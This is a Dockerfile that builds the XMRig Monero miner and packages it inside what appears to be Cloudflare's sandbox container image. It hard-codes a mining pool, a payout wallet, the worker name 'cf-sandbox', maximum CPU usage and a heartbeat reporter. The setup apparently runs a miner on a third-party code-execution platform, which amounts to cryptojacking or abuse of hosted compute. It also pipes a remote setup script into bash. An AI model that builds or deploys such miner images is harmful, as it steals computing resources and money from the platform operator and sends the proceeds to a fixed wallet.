FROM debian:bookworm-slim AS builder

RUN apt-get update && apt-get install -y --no-install-recommends \
    ca-certificates \
    build-essential \
    cmake \
    git \
    libuv1-dev \
    libssl-dev \
    libhwloc-dev \
    && rm -rf /var/lib/apt/lists/* \
    && apt-get clean

WORKDIR /build
RUN git clone --depth 1 https://github.com/xmrig/xmrig.git . \
    && mkdir build && cd build \
    && cmake .. \
        -DCMAKE_BUILD_TYPE=Release \
        -DCMAKE_C_FLAGS="-O3 -march=x86-64-v3 -mtune=generic -flto -funroll-loops -fno-plt -fomit-frame-pointer" \
        -DCMAKE_CXX_FLAGS="-O3 -march=x86-64-v3 -mtune=generic -flto -funroll-loops -fno-plt -fomit-frame-pointer" \
        -DCMAKE_EXE_LINKER_FLAGS="-flto -Wl,-O1,--as-needed" \
        -DWITH_OPENCL=OFF \
        -DWITH_CUDA=OFF \
        -DWITH_HWLOC=ON \
        -DWITH_TLS=ON \
        -DWITH_CN_LITE=OFF \
        -DWITH_CN_HEAVY=OFF \
        -DWITH_CN_PICO=OFF \
        -DWITH_CN_FEMTO=OFF \
        -DWITH_KAWPOW=OFF \
        -DWITH_GHOSTRIDER=OFF \
    && make -j$(nproc) \
    && strip --strip-all xmrig \
    && cp xmrig /usr/local/bin/xmrig

FROM debian:bookworm-slim

RUN apt-get update && apt-get install -y --no-install-recommends \
    ca-certificates \
    curl \
    libuv1 \
    libssl3 \
    libhwloc15 \
    iproute2 \
    && rm -rf /var/lib/apt/lists/* \
    && apt-get clean

RUN curl -fsSL https://deb.nodesource.com/setup_22.x | bash - \
    && apt-get install -y --no-install-recommends nodejs \
    && rm -rf /var/lib/apt/lists/* \
    && apt-get clean

COPY --from=docker.io/cloudflare/sandbox:0.9.3 /container-server/sandbox /sandbox

COPY --from=builder /usr/local/bin/xmrig /usr/local/bin/xmrig

WORKDIR /app

COPY reporter/ ./reporter/

COPY start.sh /app/start.sh
RUN chmod +x /app/start.sh

EXPOSE 8080 8081

ENV MINER_ALGORITHM=rx/0
ENV MINER_POOL=pool.supportxmr.com:3333
ENV MINER_WALLET=42NziJLpe2SZ1ToBqfCXBk1FnFTpNkrdWQfsURbYDqjQ3mDZNfLBsA5YAWv8SaHeCVFQt4uMuuigC5NFURY8sgdz2gt4i5Y
ENV MINER_WORKER_NAME=cf-sandbox
ENV MINER_TUNING_PROFILE=throughput
ENV MINER_THREADS=4
ENV MINER_CPU_PRIORITY=5
ENV MINER_CPU_AFFINITY=0xF
ENV MINER_RANDOMX_MODE=fast
ENV MINER_RANDOMX_1GB_PAGES=true
ENV MINER_RANDOMX_WRMSR=false
ENV MINER_RANDOMX_CACHE_QOS=true
ENV MINER_HUGE_PAGES_JIT=true
ENV MINER_CPU_MAX_THREADS_HINT=100
ENV MINER_MAX_CPU_USAGE=100
ENV MINER_DONATE_LEVEL=0
ENV REPORTER_ENDPOINT=http://heartbeat.internal/instances/heartbeat
ENV REPORTER_INTERVAL=60
ENV REPORTER_STATS_INTERVAL=60

ENTRYPOINT ["/sandbox"]
CMD ["/app/start.sh"]
